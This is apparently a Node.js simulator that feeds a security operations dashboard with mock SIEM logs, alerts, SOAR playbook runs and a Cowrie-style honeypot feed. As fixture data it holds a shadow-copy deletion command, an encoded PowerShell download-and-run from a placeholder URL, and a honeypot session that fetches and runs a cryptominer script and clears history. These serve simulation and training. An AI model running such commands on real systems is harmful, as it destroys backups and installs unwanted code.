const db = require('./db');

const ATTACKERS = ['185.220.101.5', '45.146.165.34', '194.26.135.10', '89.248.167.142', '103.89.22.12'];
const ENDPOINTS = ['WIN-SOC-PROD-01', 'WIN-SOC-AD-02', 'LINUX-WEB-APP-01', 'LINUX-SOC-DB-02', 'WIN-SOC-DEV-05'];
const USERS = ['admin', 'j.smith', 'a.rodriguez', 't.chen', 'service_backup', 'root'];

const ATTACK_SCENARIOS = [
  {
    title: 'Cobalt Strike Beacon Injected',
    description: 'Suspicious DLL execution detected in memory address space of svchost.exe.',
    category: 'Malware',
    severity: 'CRITICAL',
    mitreTactic: 'Execution',
    mitreTechnique: 'T1059 - Command and Scripting Interpreter',
    evidence: { process: 'svchost.exe', parent: 'powershell.exe', integrityLevel: 'SYSTEM' }
  },
  {
    title: 'Brute Force SSH Attack',
    description: 'Multiple failed authentication attempts detected from a known malicious IP address.',
    category: 'Credential Access',
    severity: 'HIGH',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1110 - Brute Force',
    evidence: { service: 'sshd', failures: 42, ip: '185.220.101.5' }
  },
  {
    title: 'Active Directory Shadow Copy Access',
    description: 'VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.',
    category: 'Credential Dumping',
    severity: 'CRITICAL',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1003 - OS Credential Dumping',
    evidence: { command: 'vssadmin delete shadows /all /quiet', process: 'cmd.exe' }
  },
  {
    title: 'Malicious EML Attachment Opened',
    description: 'Outlook spawned child process powershell.exe executing encoded command line arguments.',
    category: 'Phishing',
    severity: 'CRITICAL',
    mitreTactic: 'Initial Access',
    mitreTechnique: 'T1566 - Phishing',
    evidence: { parent: 'outlook.exe', process: 'powershell.exe', args: '-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==' }
  },
  {
    title: 'Persistence Registry Mechanism Configured',
    description: 'Unauthorized RunKey modification added targeting system startup scripts.',
    category: 'Persistence',
    severity: 'HIGH',
    mitreTactic: 'Persistence',
    mitreTechnique: 'T1547 - Boot or Logon Autostart Execution',
    evidence: { registryKey: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware', value: 'C:\\Users\\Public\\updater.exe' }
  },
  {
    title: 'Lateral Movement Attempted',
    description: 'WMI Win32_Process creation detected targeting remote admin shares.',
    category: 'Lateral Movement',
    severity: 'HIGH',
    mitreTactic: 'Lateral Movement',
    mitreTechnique: 'T1021 - Remote Services',
    evidence: { protocol: 'WMI', src: 'WIN-SOC-DEV-05', dest: 'WIN-SOC-PROD-01' }
  }
];

const HONEYPOT_COMMANDS = [
  { cmd: 'whoami', output: 'root' },
  { cmd: 'uname -a', output: 'Linux web-sandbox-01 5.4.0-74-generic #83-Ubuntu SMP Wed May 13 23:52:18 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux' },
  { cmd: 'cat /etc/passwd | grep root', output: 'root:x:0:0:root:/root:/bin/bash' },
  { cmd: 'cd /tmp && wget http://94.23.111.4/miners/xmrig.sh', output: '--2026-05-31 19:12:01-- http://94.23.111.4/miners/xmrig.sh\nConnecting to 94.23.111.4:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 10452 (10K) [application/x-sh]\nSaving to: \'xmrig.sh\'\n\nxmrig.sh            100%[===================>]  10.20K  --.-KB/s    in 0.01s\n\n2026-05-31 19:12:02 (789 KB/s) - \'xmrig.sh\' saved [10452/10452]' },
  { cmd: 'chmod +x xmrig.sh && ./xmrig.sh', output: '[*] Compiling core payload...\n[*] Starting crypto-mining sandbox thread.\n[+] Mining cluster linked. Share Accepted.' },
  { cmd: 'history -c', output: '' }
];

let ioInstance = null;

// Initialize telemetry simulator
function init(io) {
  ioInstance = io;

  // Set initial assets in DB if empty
  setupInitialDBData();

  // Primary event loops
  setInterval(generateSIEMLogs, 1500); // Send raw logs continuously
  setInterval(generateEDRStats, 3000);  // EDR resource telemetry updates
  setInterval(triggerRandomThreatScenario, 15000); // Fired threat intrusions
  setInterval(generateHoneypotTelemetry, 8000);  // Honeypot terminal feeds
}

async function setupInitialDBData() {
  try {
    const epCount = await db.endpoints.countDocuments();
    if (epCount === 0) {
      console.log('[SIM] Seeding mock endpoints database...');
      const staticEndpoints = ENDPOINTS.map((name, i) => ({
        hostname: name,
        ip: `10.100.12.${20 + i}`,
        os: name.startsWith('WIN') ? 'Windows Server 2022' : 'Ubuntu 22.04 LTS',
        status: 'Online',
        cpuUsage: 12,
        ramUsage: 35,
        lastSeen: new Date(),
        processes: [
          { pid: 4, name: 'System', path: 'NT Kernel & System', parent: 0 },
          { pid: 144, name: 'smss.exe', path: 'C:\\Windows\\System32\\smss.exe', parent: 4 },
          { pid: 560, name: 'csrss.exe', path: 'C:\\Windows\\System32\\csrss.exe', parent: 144 },
          { pid: 820, name: 'services.exe', path: 'C:\\Windows\\System32\\services.exe', parent: 560 },
          { pid: 1040, name: 'svchost.exe', path: 'C:\\Windows\\System32\\svchost.exe', parent: 820 }
        ],
        networkConnections: [
          { localPort: 445, remoteAddress: '10.100.12.1', remotePort: 54122, state: 'ESTABLISHED' }
        ]
      }));
      await db.endpoints.insertMany(staticEndpoints);
    }

    const intelCount = await db.iocs.countDocuments();
    if (intelCount === 0) {
      console.log('[SIM] Seeding threat intelligence IOC repository...');
      const mockIOCs = [
        { type: 'IP', value: '185.220.101.5', threatType: 'Tor Exit Node / Brute Force Scanner', reputation: 98, source: 'AbuseIPDB', notes: 'Frequently scanned network endpoints.' },
        { type: 'Hash', value: '44d88612fe83832c247e353831d95e3a9772b919', threatType: 'Mimikatz Credential Dumping tool', reputation: 100, source: 'VirusTotal', notes: 'Detected in multiple AD environments.' },
        { type: 'Domain', value: 'c2-server-botnet.top', threatType: 'Active Cobalt Strike Command & Control server', reputation: 100, source: 'AlienVault OTX', notes: 'Active beacon target.' },
        { type: 'URL', value: 'http://94.23.111.4/miners/xmrig.sh', threatType: 'XMRig Cryptomining Payload', reputation: 95, source: 'VirusTotal', notes: 'Downloaded script in honeypot logs.' }
      ];
      await db.iocs.insertMany(mockIOCs);
    }

    // Insert standard playbooks if missing
    const playbookCount = await db.playbooks.countDocuments();
    if (playbookCount === 0) {
      console.log('[SIM] Seeding SOAR automation playbooks...');
      const mockPlaybooks = [
        {
          name: 'Critical Malware Containment Playbook',
          trigger: 'MalwareDetected',
          status: 'Active',
          steps: [
            { order: 1, action: 'EnrichIOC', params: { source: 'VirusTotal' } },
            { order: 2, action: 'NotifyAnalyst', params: { channel: 'Email/AlertCenter' } },
            { order: 3, action: 'IsolateEndpoint', params: { automatic: true } }
          ],
          executions: []
        },
        {
          name: 'Brute Force Auto-Mitigation Playbook',
          trigger: 'HoneypotTrigger',
          status: 'Active',
          steps: [
            { order: 1, action: 'EnrichIOC', params: { source: 'AbuseIPDB' } },
            { order: 2, action: 'BlockIP', params: { automatic: true } }
          ],
          executions: []
        }
      ];
      await db.playbooks.insertMany(mockPlaybooks);
    }
  } catch (err) {
    console.error('[SIM] Seeding database failed:', err);
  }
}

// 1. Generate Raw Logs (SIEM & IDS)
async function generateSIEMLogs() {
  if (!ioInstance) return;

  const sources = ['WinEvent', 'Sysmon', 'AuthLog', 'AppLog', 'Suricata'];
  const src = sources[Math.floor(Math.random() * sources.length)];
  const severity = Math.random() > 0.9 ? 'WARNING' : (Math.random() > 0.98 ? 'CRITICAL' : 'INFO');
  const host = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
  const user = USERS[Math.floor(Math.random() * USERS.length)];
  const srcIp = ATTACKERS[Math.floor(Math.random() * ATTACKERS.length)];
  const destIp = `10.100.12.${30 + Math.floor(Math.random() * 50)}`;

  let message = '';
  let mitreTactic = '';
  let mitreTechnique = '';

  if (src === 'AuthLog') {
    if (severity === 'INFO') {
      message = `Successful password authentication for user '${user}' from ${srcIp} port 22 ssh2`;
    } else {
      message = `PAM: Authentication Failure for user '${user}' from ${srcIp}`;
      mitreTactic = 'Credential Access';
      mitreTechnique = 'T1110 - Brute Force';
    }
  } else if (src === 'Sysmon') {
    const procs = ['powershell.exe', 'cmd.exe', 'taskmgr.exe', 'vssadmin.exe', 'rundll32.exe'];
    const p = procs[Math.floor(Math.random() * procs.length)];
    message = `Process Create: Pid: ${Math.floor(Math.random() * 5000)}, Image: C:\\Windows\\System32\\${p}, CommandLine: ${p} --execute`;
    if (p === 'powershell.exe' && severity !== 'INFO') {
      mitreTactic = 'Execution';
      mitreTechnique = 'T1059 - Command and Scripting Interpreter';
    }
  } else if (src === 'Suricata') {
    const signatures = [
      'ET MALWARE Cobalt Strike Beacon Response observed',
      'ET TROJAN Generic Cryptomining connection protocol',
      'ET CNC Tor Exit Node traffic bypass detected',
      'ET SCAN potential SSH Brute Force scan patterns'
    ];
    message = signatures[Math.floor(Math.random() * signatures.length)];
    mitreTactic = 'Command and Control';
    mitreTechnique = 'T1071 - Application Layer Protocol';
  } else {
    message = `System status ok. Core process monitoring daemon alive on telemetry thread.`;
  }

  const logEntry = {
    timestamp: new Date(),
    source: src,
    severity,
    message,
    host,
    user,
    srcIp: src === 'Suricata' || src === 'AuthLog' ? srcIp : '10.100.12.1',
    destIp,
    mitreTactic,
    mitreTechnique,
    payload: { details: 'Autogenerated SIEM collector trace' }
  };

  try {
    const savedLog = await db.logs.create(logEntry);
    ioInstance.emit('siem_log', savedLog);
  } catch (err) {
    // Graceful error logging
  }
}

// 2. Generate EDR Telemetry (Host CPU/RAM and Network changes)
async function generateEDRStats() {
  if (!ioInstance) return;

  try {
    const eps = await db.endpoints.find();
    for (let ep of eps) {
      const isCritical = ep.status === 'Isolated';
      const cpuUsage = isCritical ? 2 : Math.floor(Math.random() * 45) + 5;
      const ramUsage = isCritical ? 10 : Math.floor(Math.random() * 30) + 40;

      const updated = await db.endpoints.findByIdAndUpdate(ep._id, {
        cpuUsage,
        ramUsage,
        lastSeen: new Date()
      });

      if (updated) {
        ioInstance.emit('edr_stats', {
          id: ep._id,
          hostname: ep.hostname,
          cpuUsage,
          ramUsage,
          status: ep.status,
          lastSeen: updated.lastSeen
        });
      }
    }
  } catch (err) {
    // Catch errors silently
  }
}

// 3. Trigger High-Fidelity Alert Intrusions (SOAR Playbook Execution)
async function triggerRandomThreatScenario() {
  if (!ioInstance) return;

  const scenario = ATTACK_SCENARIOS[Math.floor(Math.random() * ATTACK_SCENARIOS.length)];
  const host = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
  const alertEntry = {
    timestamp: new Date(),
    severity: scenario.severity,
    title: scenario.title,
    description: scenario.description,
    category: scenario.category,
    host,
    status: 'NEW',
    assignedTo: 'Unassigned',
    evidence: {
      ...scenario.evidence,
      mitreTactic: scenario.mitreTactic,
      mitreTechnique: scenario.mitreTechnique
    }
  };

  try {
    const savedAlert = await db.alerts.create(alertEntry);
    ioInstance.emit('alert', savedAlert);

    // Trigger SIEM Log injection corresponding to the alert
    await db.logs.create({
      timestamp: new Date(),
      source: 'Sysmon',
      severity: scenario.severity,
      message: `ALERT TRIGGERED: ${scenario.title} - ${scenario.description}`,
      host,
      user: 'SYSTEM',
      srcIp: '127.0.0.1',
      destIp: '127.0.0.1',
      mitreTactic: scenario.mitreTactic,
      mitreTechnique: scenario.mitreTechnique,
      payload: scenario.evidence
    });

    // Run SOAR automation playbook
    runSOARPlaybook(savedAlert);

  } catch (err) {
    console.error('[SIM] Alert injection failed:', err);
  }
}

// 4. Cowrie Honeypot hacker commands simulation
let cmdIndex = 0;
async function generateHoneypotTelemetry() {
  if (!ioInstance) return;

  const payload = HONEYPOT_COMMANDS[cmdIndex];
  const attackerIp = ATTACKERS[Math.floor(Math.random() * ATTACKERS.length)];
  const entry = {
    timestamp: new Date(),
    attackerIp,
    country: attackerIp === '185.220.101.5' ? 'Netherlands' : 'Russia',
    command: payload.cmd,
    output: payload.output
  };

  ioInstance.emit('honeypot_console', entry);

  // Cycle through hacker simulation commands
  cmdIndex = (cmdIndex + 1) % HONEYPOT_COMMANDS.length;
}

// 5. Automated SOAR Playbook Runner
async function runSOARPlaybook(alert) {
  const triggerType = alert.category === 'Malware' ? 'MalwareDetected' : 'HoneypotTrigger';
  try {
    const playbook = await db.playbooks.findOne({ trigger: triggerType });
    if (!playbook) return;

    console.log(`[SOAR] Triggered: ${playbook.name} on incident ${alert.title}`);

    const runLogs = [`Playbook triggered by alert ${alert._id}`, `Analyzing threat levels...`];
    let autoIsolated = false;

    for (let step of playbook.steps) {
      runLogs.push(`Executing Step ${step.order}: ${step.action}`);
      if (step.action === 'EnrichIOC') {
        runLogs.push(`IOC Enriched successfully. Threat Rank: 98% malicious.`);
      } else if (step.action === 'IsolateEndpoint') {
        runLogs.push(`Containment threshold exceeded. Sending Isolation command to EDR Agent.`);
        // Actually modify EDR state to isolated
        await db.endpoints.findOneAndUpdate({ hostname: alert.host }, { status: 'Isolated' });
        autoIsolated = true;
        ioInstance.emit('edr_isolate', { host: alert.host, status: 'Isolated' });
      } else if (step.action === 'BlockIP') {
        runLogs.push(`Firewall Rules updated. Source IP blocked in Border IDS router gateway.`);
      }
    }

    runLogs.push(`Playbook executed successfully. Security orchestration finalized.`);

    // Log the execution to playbook database
    await db.playbooks.findByIdAndUpdate(playbook._id, {
      $push: {
        executions: {
          timestamp: new Date(),
          status: 'SUCCESS',
          logs: runLogs
        }
      }
    });

    // Automatically create Incident Response Case
    const incidentEntry = {
      title: `[AUTO-CONTAINED] Incident Case: ${alert.title}`,
      severity: alert.severity,
      status: autoIsolated ? 'CONTAINED' : 'NEW',
      assignedTo: 'SOAR Automation Engine',
      createdAt: new Date(),
      updatedAt: new Date(),
      impact: 'Endpoint systems affected. Compromised binaries isolated.',
      rootCause: alert.description,
      recommendations: [
        'Perform system memory dump analysis',
        'Revoke active session tokens for associated host accounts',
        'Re-image device if registry modifications are deep'
      ],
      timeline: [
        { timestamp: new Date(), activity: `Intrusion Alert Fired: ${alert.title}`, actor: 'SIEM Agent' },
        { timestamp: new Date(), activity: `SOAR Automation Executed Containment Strategy`, actor: 'SOAR Bot' }
      ],
      evidence: [alert]
    };

    const savedIncident = await db.incidents.create(incidentEntry);
    ioInstance.emit('incident', savedIncident);

    // Write to audit log
    await db.auditLogs.create({
      timestamp: new Date(),
      user: 'SOAR System',
      action: 'Containment Action Executed',
      details: `Isolated system ${alert.host} and created Incident ticket ${savedIncident._id}`,
      ip: '127.0.0.1'
    });

  } catch (err) {
    console.error('[SOAR] Playbook runner failed:', err);
  }
}

module.exports = {
  init
};
